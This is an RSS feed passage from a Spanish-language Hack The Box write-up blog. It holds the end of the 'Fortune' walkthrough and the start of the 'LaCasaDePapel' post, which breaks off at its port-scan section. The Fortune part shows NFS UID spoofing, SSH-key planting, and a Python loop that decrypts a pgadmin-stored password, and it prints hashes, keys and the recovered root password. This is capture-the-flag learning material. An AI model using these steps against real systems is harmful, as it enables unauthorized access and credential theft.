&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~# groupadd --gid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; charlie_group
root@kali:~# useradd --uid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; --groups charlie_group charlie_user
root@kali:~# sudo -u charlie_user ls -l tmp_nfs/charlie
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con ello logramos acceder y obtener tambien nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-43-48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-45-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tenemos acceso a la carpeta de charlie podemos agregar nuestra clave ssh a &lt;code&gt;authorized_keys&lt;/code&gt; para poder logearnos con el servicio ssh como charlie.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-55-26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;De la misma forma para el usuario bob:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-21%2000-50-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;escalacion-de-privilegios&#34;&gt;ESCALACION DE PRIVILEGIOS&lt;/h1&gt;
&lt;p&gt;Dentro de la carpeta charlie nos encontramos con un archivo &lt;code&gt;mbox&lt;/code&gt;, que contiene un mensaje de bob para charlie.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-20%2023-58-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dice que bob cambio la contraseña para el usuario dba es la misma que la del usuario root, haciendo una enumeracion de carpetas y archivos nos encontramos un archivo &lt;code&gt;pgadmin4.db&lt;/code&gt; que contiene tablas que le pertenecen a &lt;code&gt;pgadmin3.4&lt;/code&gt;, utilizando sqlite db browser, dentro de este archivo encontramos una contraseña y usuario &lt;code&gt;dba&lt;/code&gt; especificamente en la tabla de &lt;code&gt;server&lt;/code&gt;, tambien una tabla que contiene usuario y contraseña de bob y charlie.&lt;/p&gt;
&lt;p&gt;Ruta del archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/var/appsrv/pgadmin4/pgadmin4.db
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-13-19.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos la ruta donde se encuentran los documentos de pgadmin dentro del archivo &lt;code&gt;pgadmin4.ini&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-14-06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;dba&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2016-56-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;bob y charlie&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2016-58-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;usuario-root&#34;&gt;Usuario ROOT&lt;/h2&gt;
&lt;p&gt;En la ruta de pgadmin4 local (&lt;code&gt;/usr/local/pgadmin4/pgadmin4-3.4/web/utils/)&lt;/code&gt;, encontramos un archivo llamado crypto.py, en su interior encontramos funciones las cuales encriptan y desencriptan contraseñas (&lt;code&gt;encrypt(), decrypt(), pad(), pqencryptpassword()&lt;/code&gt;), la funcion de &lt;code&gt;encrypt()&lt;/code&gt; necesita un texto y una clave, la funcion &lt;code&gt;decrypt()&lt;/code&gt; el texto encriptado (&lt;code&gt;ciphertext&lt;/code&gt;) anteriormente con la funcion &lt;code&gt;encrypt()&lt;/code&gt; y la clave, con estas dos funciones y la contraseña que se encuentra en la tabla de server del usuario &lt;code&gt;dba&lt;/code&gt;, podemos intentar desencriptarla solo nos falta la clave (key).&lt;/p&gt;
&lt;p&gt;Dentro de la base de datos (pgadmin4.db) encontramos algunas claves (tabla -&amp;gt; keys) que podriamos utilizar para la funcion decrypt(), de igual forma los usuarios (tabla -&amp;gt; users) y contraseñas (tabla -&amp;gt; users).&lt;/p&gt;
&lt;p&gt;Localmente agregamos el siguiente codigo a nuestro archivo crypto.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;list_keys&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;www&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postgresql&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgadmin4&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fortune&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charlie&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;bob&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nfsuser&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;authpf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pgadmin3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;bob@fortune.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;charlie@fortune.htb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;dba&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postgres&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                  &lt;span class=&#34;s1&#34;&gt;&amp;#39;$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    
    &lt;span class=&#34;n&#34;&gt;pass_dba&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz&amp;#34;&lt;/span&gt;
    
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list_keys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pass_dba&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; : &amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Esta porcion de codigo contiene una lista de las claves (keys) probables para la contraseña (&lt;code&gt;pass_dba&lt;/code&gt;) del usuario dba que corresponde igualmente para el usuario root, dentro de las claves tambien encontramos usuarios, ya que una key podria ser o no el nombre de un usuario, de igual manera agregamos las contraseñas de la base de datos de los usuarios bob y charlie. En resumen agregamos a la lista todas las posibles claves que encontramos dentro de la maquina. Al correr nuestro script obtenemos el siguente resultado:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-39-55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestra contraseña para el usuario dba y para root es &lt;code&gt;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&lt;/code&gt;, la clave que fue satisfactoria fue una contraseña en este caso la contraseña de bob que se encuentra en la base de datos. Asi obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-22%2017-42-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/fortune/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/fortune/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>openssl</category>
            
          
            
              <category>rpcinfo</category>
            
          
            
              <category>nfs</category>
            
          
            
              <category>showmount</category>
            
          
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - LaCasaDePapel</title>
        <link>https://sckull.github.io/posts/lacasadepapel/</link>
        <pubDate>Sat, 27 Jul 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 27 Jul 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/lacasadepapel/</guid>
        <description>LaCasaDePapel es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;LaCasaDePapel es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/lacasadepapel/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/181&#34;&gt;LaCasaDePapel&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.131&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/4615&#34;&gt;thek&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/4615&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7, 5, 6.1, 3.9, 5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 5, 8, 2, 5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de todos los puertos tcp/udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
